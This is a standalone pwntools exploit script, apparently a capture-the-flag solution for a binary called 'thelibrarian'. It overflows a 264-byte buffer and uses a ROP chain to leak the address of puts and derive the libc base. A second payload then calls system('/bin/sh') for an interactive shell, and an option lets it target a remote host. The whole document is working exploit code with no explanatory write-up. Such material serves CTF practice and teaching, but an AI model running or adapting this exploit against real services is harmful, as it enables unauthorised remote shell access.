#!/home/gh0st69/.venv/bin/python
from pwn import *


elf = context.binary = ELF("thelibrarian")
context.terminal = ["tmux", "splitw", "-v"]
libc = ELF("libc.so.6", checksec=False)

gs = '''
   continue
'''

def exploit():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(*(sys.argv[1].split(":")))
    else:
        return process(elf.path)


p = exploit()

rop = ROP(elf)

payload = b'A' * 264
payload += p64(rop.rdi[0])
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym.main)

p.sendlineafter(b":", payload)


p.recvline()
p.recvline()
p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00'))

log.success(f'leaked_addr: {hex(leak)}')

libc.address = leak - libc.sym.puts 

log.success(f'leaked_libc_base: {hex(libc.address)}')

payload = b'\x90' * 264
payload += p64(rop.rdi[0])
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(rop.ret[0]) # stack alignment 
payload += p64(libc.sym.system)

p.sendlineafter(b":", payload)
p.interactive()
